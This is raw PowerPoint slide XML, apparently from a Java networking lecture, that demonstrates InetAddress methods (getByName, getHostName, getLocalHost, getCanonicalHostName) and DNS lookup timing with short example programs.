                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address = InetAddress.getByName("141.146.8.66");</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address.getHostName()); // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Need to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>the DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>server to get the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>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InetAddress address = InetAddress.getByName("1.2.3.4"); // IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address does not exist</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>System.out.println(address.getHostName()); // Return the IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="114299" y="168470"/>
            <a:ext cx="11811000" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1752601" y="990600"/>
            <a:ext cx="8424863" cy="556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p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46084" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="304800" y="909578"/>
            <a:ext cx="11811000" cy="572464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400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7F0055"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>java.net.*;</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DomainName {</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public static void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>main(String[] args) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>throws </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Exception{</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long time = 0;</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get the local name</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address1 = InetAddress.getLocalHost();</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Local host name: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" + address1.getHostName());</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Return the domain name directly</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>InetAddress address2 =InetAddress.getByName("www.szu.edu.cn");</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time = System.currentTimeMillis();</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System.out.print(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Get the domain name directly: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" + address2.getHostName());</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Time taken: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"</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 String.valueOf(System.currentTimeMillis() - time) + " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>milliseconds </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>");</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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Look up the domain name </a:t>
            </a:r>
            <a:endParaRPr lang="en-US"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InetAddress address3 = InetAddress.getByName("210.39.3.164");</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System.out.println("address3: " + address3); // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Domain name is empty</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>time = System.currentTimeMillis();</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System.out.print(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Find the domain name through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>DNS : "+address3.getHostName());</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System.out.println(" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Time taken: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>" + String.valueOf(System.currentTimeMillis() - time)+ " </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>milliseconds </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>");</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System.out.println("address3: " + address3); // </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>Output domain name and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>address at the same time</a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buClrTx/>
              <a:buSzTx/>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</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a:t>
            </a:r>
            <a:endParaRPr lang="en-GB" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="114299" y="168470"/>
            <a:ext cx="11811000" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Eg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>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304800" y="838200"/>
            <a:ext cx="11353800" cy="556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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Running results:</a:t>
            </a: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r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>Analysis: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>The first millisecond is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>, while the second millisecond is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>92 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>InetAddress object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>created using the domain name does not access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the DNS server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>when using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getHostName method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>InetAddress object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>created using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the IP address </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>needs to access </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>the DNS server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>when using the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>getHostName method </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2000" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="460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28801" y="1981200"/>
            <a:ext cx="5654675"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114299" y="168470"/>
            <a:ext cx="11811000" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Eg</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>: Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>getHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to obtain the domain name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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304801" y="948267"/>
            <a:ext cx="11658599" cy="5715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000" dirty="0"/>
              <a:t>Method definition:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>getHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>(): Returns the first reverse-DNS entry (may be cached).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1"/>
              <a:t>getCanonicalHostName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>(): Performs a full DNS lookup to get the official (canonical) hostname.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1">
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="矩形 5"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2895600" y="990600"/>
            <a:ext cx="8348662" cy="3397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dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>public String getCanonicalHostName()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="76200" y="228600"/>
            <a:ext cx="11887200" cy="523220"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="zh-CN" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>the getCanonicalHostName </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>method to get the host name</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="3" name="Table 2"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="304801" y="2896014"/>
          <a:ext cx="11388724" cy="2024820"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="3433620"/>
                <a:gridCol w="3977552"/>
